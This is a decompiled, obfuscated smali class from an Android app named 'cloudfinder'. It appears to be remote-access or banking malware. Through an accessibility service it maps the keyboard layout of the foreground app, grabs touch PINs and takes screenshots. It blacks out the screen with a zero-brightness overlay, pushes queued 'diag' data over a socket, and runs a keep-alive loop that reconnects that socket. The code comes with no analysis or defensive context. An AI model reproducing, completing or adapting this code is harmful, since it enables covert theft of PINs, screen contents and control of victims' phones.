.class public final synthetic Lڝږ؁ڋ/ا;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final synthetic آ:I


# direct methods
.method public synthetic constructor <init>(I)V
    .locals 0

    iput p1, p0, Lڝږ؁ڋ/ا;->آ:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 10

    iget v0, p0, Lڝږ؁ڋ/ا;->آ:I

    const-wide/16 v1, 0x1388

    const/4 v3, 0x3

    const/4 v4, 0x0

    const/4 v5, 0x0

    packed-switch v0, :pswitch_data_0

    goto/16 :goto_a

    :pswitch_0
    sget-object v0, Lڝږ؁ڋ/ه;->آ:Landroid/view/View;

    if-eqz v0, :cond_0

    sget-boolean v0, Lڝږ؁ڋ/ه;->ؠ:Z

    if-eqz v0, :cond_0

    sget-object v0, Lڝږ؁ڋ/ه;->آ:Landroid/view/View;

    invoke-virtual {v0, v5}, Landroid/view/View;->setVisibility(I)V

    :cond_0
    sput-boolean v5, Lڝږ؁ڋ/ه;->ؤ:Z

    return-void

    :pswitch_1
    sget-object v0, Lڝږ؁ڋ/ه;->؋:Landroid/os/Handler;

    sget-object v0, Lڝږ؁ڋ/غ;->؋:Ljava/util/ArrayList;

    const-string v0, "Keyboard mapped: "

    :try_start_0
    sget-object v3, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    sget-object v3, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    if-nez v3, :cond_1

    goto/16 :goto_1

    :cond_1
    invoke-virtual {v3}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-nez v3, :cond_2

    goto/16 :goto_1

    :cond_2
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v4

    if-eqz v4, :cond_3

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v4

    invoke-interface {v4}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v4

    goto :goto_0

    :cond_3
    const-string v4, ""

    :goto_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v5

    sget-object v7, Lڝږ؁ڋ/غ;->ء:Ljava/lang/String;

    invoke-virtual {v4, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_4

    sget-wide v7, Lڝږ؁ڋ/غ;->ؠ:J

    sub-long v7, v5, v7

    cmp-long v1, v7, v1

    if-gez v1, :cond_4

    sget-object v1, Lڝږ؁ڋ/غ;->؋:Ljava/util/ArrayList;

    invoke-virtual {v1}, Ljava/util/ArrayList;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_4

    goto :goto_1

    :cond_4
    new-instance v1, Ljava/util/ArrayList;

    invoke-direct {v1}, Ljava/util/ArrayList;-><init>()V

    invoke-static {v3, v1}, Lڝږ؁ڋ/غ;->؋(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/util/ArrayList;)V

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    invoke-virtual {v1}, Ljava/util/ArrayList;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_5

    sget-object v2, Lڝږ؁ڋ/غ;->؋:Ljava/util/ArrayList;

    monitor-enter v2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :try_start_1
    invoke-virtual {v2}, Ljava/util/ArrayList;->clear()V

    invoke-virtual {v2, v1}, Ljava/util/ArrayList;->addAll(Ljava/util/Collection;)Z

    monitor-exit v2
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :try_start_2
    sput-wide v5, Lڝږ؁ڋ/غ;->ؠ:J

    sput-object v4, Lڝږ؁ڋ/غ;->ء:Ljava/lang/String;

    const-string v2, "KbdMapper"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/util/ArrayList;->size()I

    move-result v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v0, " keys from "

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_1

    :catchall_0
    move-exception v0

    :try_start_3
    monitor-exit v2
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    :try_start_4
    throw v0
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    :catch_0
    move-exception v0

    const-string v1, "KbdMapper"

    const-string v2, "dumpKeyboard error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_5
    :goto_1
    return-void

    :pswitch_2
    sget-object v0, Lڝږ؁ڋ/ه;->؋:Landroid/os/Handler;

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "Timeout after "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget v1, Lڝږ؁ڋ/ه;->ب:I

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v1, "s, stopping"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "TouchPinGrab"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-static {}, Lڝږ؁ڋ/ه;->ء()V

    return-void

    :pswitch_3
    sget-boolean v0, Lںڍڒڸ/ش;->إ:Z

    if-nez v0, :cond_6

    goto :goto_3

    :cond_6
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    sget-object v0, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    if-nez v0, :cond_7

    goto :goto_2

    :cond_7
    invoke-static {}, Lڜٟٱڀ/ؤ;->؋()Lڜٟٱڀ/ؤ;

    move-result-object v1

    if-eqz v1, :cond_a

    iget-object v2, v1, Lڜٟٱڀ/ؤ;->؋:Lڜٟٱڀ/ش;

    const/4 v3, 0x1

    if-eqz v2, :cond_8

    invoke-virtual {v2}, Lڜٟٱڀ/ش;->ء()Z

    move-result v2

    if-eqz v2, :cond_8

    move v5, v3

    :cond_8
    if-nez v5, :cond_9

    goto :goto_2

    :cond_9
    :try_start_5
    sget-object v2, Lںڍڒڸ/ش;->ؤ:Ljava/util/concurrent/ExecutorService;

    new-instance v4, Lڜٟٱڀ/آ;

    invoke-direct {v4, v3, v1}, Lڜٟٱڀ/آ;-><init>(ILjava/lang/Object;)V

    invoke-static {v0, v2, v4}, Landroidx/core/view/accessibility/أ;->د(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;Ljava/util/concurrent/ExecutorService;Lڜٟٱڀ/آ;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1

    goto :goto_3

    :catch_1
    move-exception v0

    const-string v1, "ThumbUp"

    const-string v2, "capture error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_a
    :goto_2
    invoke-static {}, Lںڍڒڸ/ش;->ٸ()V

    :goto_3
    return-void

    :pswitch_4
    invoke-static {}, Lڗًقڔ/؋;->ؿ()V

    return-void

    :pswitch_5
    sget-object v0, Lڝږ؁ڋ/ك;->إ:Ljava/lang/String;

    if-eqz v0, :cond_b

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v5

    sget-wide v7, Lڝږ؁ڋ/ك;->ئ:J

    sub-long/2addr v5, v7

    cmp-long v0, v5, v1

    if-ltz v0, :cond_b

    invoke-static {}, Lڝږ؁ڋ/ك;->ء()V

    :cond_b
    sput-object v4, Lڝږ؁ڋ/ك;->ب:Lڝږ؁ڋ/ا;

    return-void

    :pswitch_6
    sget v0, Lڝږ؁ڋ/ؼ;->ؤ:I

    if-lt v0, v3, :cond_c

    sget-object v0, Lڝږ؁ڋ/ؼ;->آ:Ljava/lang/Runnable;

    if-nez v0, :cond_c

    const-string v0, "ACTION_UP delayed flush"

    invoke-static {v0}, Lڝږ؁ڋ/ؼ;->؋(Ljava/lang/String;)V

    invoke-static {}, Lڝږ؁ڋ/ؼ;->آ()V

    :cond_c
    return-void

    :pswitch_7
    sget v0, Lڝږ؁ڋ/ؼ;->ؤ:I

    if-lt v0, v3, :cond_d

    sget-boolean v0, Lڝږ؁ڋ/ؼ;->؋:Z

    if-eqz v0, :cond_d

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "SAFETY_FLUSH timeout dots="

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget v1, Lڝږ؁ڋ/ؼ;->ؤ:I

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lڝږ؁ڋ/ؼ;->؋(Ljava/lang/String;)V

    invoke-static {}, Lڝږ؁ڋ/ؼ;->آ()V

    :cond_d
    sput-object v4, Lڝږ؁ڋ/ؼ;->أ:Lڝږ؁ڋ/ا;

    return-void

    :pswitch_8
    sget-object v0, Lڝږ؁ڋ/ر;->ؠ:Ljava/util/concurrent/ExecutorService;

    const-string v0, "[]"

    const-string v1, "queue"

    const-string v2, "DiagReporter"

    :try_start_6
    invoke-static {}, Lcom/lite/cloudfinder/App;->؋()Landroid/content/Context;

    move-result-object v3

    if-nez v3, :cond_e

    goto :goto_5

    :cond_e
    const-string v4, "diag_log"

    invoke-virtual {v3, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    invoke-interface {v3, v1, v0}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    new-instance v6, Lorg/json/JSONArray;

    invoke-direct {v6, v4}, Lorg/json/JSONArray;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6}, Lorg/json/JSONArray;->length()I

    move-result v4

    if-nez v4, :cond_f

    goto :goto_5

    :cond_f
    invoke-static {}, Lڜٟٱڀ/د;->ؠ()Lڜٟٱڀ/د;

    move-result-object v4

    if-eqz v4, :cond_13

    invoke-virtual {v4}, Lڜٟٱڀ/د;->آ()Z

    move-result v7

    if-nez v7, :cond_10

    goto :goto_5

    :cond_10
    iget-object v4, v4, Lڜٟٱڀ/د;->آ:Lةؽڗںۍټ٘/ء;

    if-nez v4, :cond_11

    goto :goto_5

    :cond_11
    move v7, v5

    :goto_4
    invoke-virtual {v6}, Lorg/json/JSONArray;->length()I

    move-result v8

    if-ge v5, v8, :cond_12

    invoke-virtual {v6, v5}, Lorg/json/JSONArray;->getJSONObject(I)Lorg/json/JSONObject;

    move-result-object v8
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_3

    :try_start_7
    const-string v9, "diag"

    invoke-virtual {v4, v9, v8}, Lةؽڗںۍټ٘/ء;->آ(Ljava/lang/String;Lorg/json/JSONObject;)Z
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_2

    add-int/lit8 v7, v7, 0x1

    :catch_2
    add-int/lit8 v5, v5, 0x1

    goto :goto_4

    :cond_12
    if-lez v7, :cond_13

    :try_start_8
    invoke-interface {v3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v3

    invoke-interface {v3, v1, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Flushed "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v1, " local diag logs"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_3

    goto :goto_5

    :catch_3
    move-exception v0

    const-string v1, "flushLocal error"

    invoke-static {v2, v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_13
    :goto_5
    return-void

    :pswitch_9
    sget-object v0, Lڝږ؁ڋ/د;->ء:Ljava/util/concurrent/atomic/AtomicBoolean;

    invoke-virtual {v0}, Ljava/util/concurrent/atomic/AtomicBoolean;->get()Z

    move-result v1

    if-nez v1, :cond_14

    goto :goto_8

    :cond_14
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1e

    if-ge v1, v2, :cond_15

    const-string v0, "Screenshot requires Android R (API 30)+"

    goto :goto_6

    :cond_15
    invoke-virtual {v0}, Ljava/util/concurrent/atomic/AtomicBoolean;->get()Z

    move-result v0

    if-nez v0, :cond_16

    goto :goto_7

    :cond_16
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    sget-object v0, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    if-nez v0, :cond_17

    const-string v0, "No accessibility service"

    :goto_6
    const-string v1, "BmtvScreenCapture"

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_7

    :cond_17
    sget-object v1, Lڝږ؁ڋ/د;->ئ:Ljava/util/concurrent/ExecutorService;

    new-instance v2, Lڝږ؁ڋ/خ;

    invoke-direct {v2}, Lڝږ؁ڋ/خ;-><init>()V

    invoke-static {v0, v1, v2}, Landroidx/core/view/accessibility/أ;->ذ(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;Ljava/util/concurrent/ExecutorService;Lڝږ؁ڋ/خ;)V

    :goto_7
    invoke-static {}, Lڝږ؁ڋ/د;->ء()V

    :goto_8
    return-void

    :pswitch_a
    sget v0, Lڝږ؁ڋ/ج;->؋:I

    const-string v0, "BmtvOverlay"

    :try_start_9
    sget-object v1, Lڝږ؁ڋ/ح;->آ:Ljava/lang/ref/WeakReference;

    if-eqz v1, :cond_19

    invoke-virtual {v1}, Ljava/lang/ref/Reference;->get()Ljava/lang/Object;

    move-result-object v2

    if-nez v2, :cond_18

    goto :goto_9

    :cond_18
    invoke-virtual {v1}, Ljava/lang/ref/Reference;->get()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/View;

    invoke-virtual {v1}, Landroid/view/View;->getLayoutParams()Landroid/view/ViewGroup$LayoutParams;

    move-result-object v2

    instance-of v3, v2, Landroid/view/WindowManager$LayoutParams;

    if-eqz v3, :cond_19

    check-cast v2, Landroid/view/WindowManager$LayoutParams;

    const/4 v3, 0x0

    iput v3, v2, Landroid/view/WindowManager$LayoutParams;->screenBrightness:F

    invoke-virtual {v1}, Landroid/view/View;->getContext()Landroid/content/Context;

    move-result-object v3

    const-string v4, "window"

    invoke-virtual {v3, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/WindowManager;

    if-eqz v3, :cond_19

    invoke-interface {v3, v1, v2}, Landroid/view/ViewManager;->updateViewLayout(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    const-string v1, "reapplyBrightness: screenBrightness=0 re-applied"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_4

    goto :goto_9

    :catch_4
    move-exception v1

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "reapplyBrightness error: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :cond_19
    :goto_9
    return-void

    :pswitch_b
    invoke-static {}, Lڝږ؁ڋ/ح;->ت()V

    return-void

    :pswitch_c
    invoke-static {}, Lڝږ؁ڋ/ح;->ء()V

    return-void

    :pswitch_d
    invoke-static {}, Lڝږ؁ڋ/ح;->ت()V

    return-void

    :pswitch_e
    sget-object v0, Lڗًقڔ/؋;->ح:Landroid/accessibilityservice/AccessibilityService;

    const/4 v1, 0x2

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    invoke-static {}, Lڗًقڔ/؋;->ج()V

    return-void

    :goto_a
    sget-object v0, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->ؤ:Ljava/lang/String;

    const-string v0, "SocketNotification"

    :cond_1a
    :goto_b
    const-wide/16 v1, 0x7530

    :try_start_a
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V

    invoke-static {}, Lڜٟٱڀ/د;->ؠ()Lڜٟٱڀ/د;

    move-result-object v1

    if-eqz v1, :cond_1b

    invoke-static {}, Lڜٟٱڀ/د;->ؠ()Lڜٟٱڀ/د;

    move-result-object v1

    invoke-virtual {v1}, Lڜٟٱڀ/د;->آ()Z

    move-result v2

    if-nez v2, :cond_1b

    const-string v2, "Guardian: socket disconnected, triggering reconnect"

    invoke-static {v0, v2}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {v1}, Lڜٟٱڀ/د;->؋()V

    :cond_1b
    sget-object v1, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    if-nez v1, :cond_1a

    const-string v1, "Guardian: accessibility service is null"

    invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_a
    .catch Ljava/lang/InterruptedException; {:try_start_a .. :try_end_a} :catch_6
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_5

    goto :goto_b

    :catch_5
    move-exception v1

    const-string v2, "Guardian loop err"

    invoke-static {v0, v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    goto :goto_b

    :catch_6
    return-void

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_e
        :pswitch_d
        :pswitch_c
        :pswitch_b
        :pswitch_a
        :pswitch_9
        :pswitch_8
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method
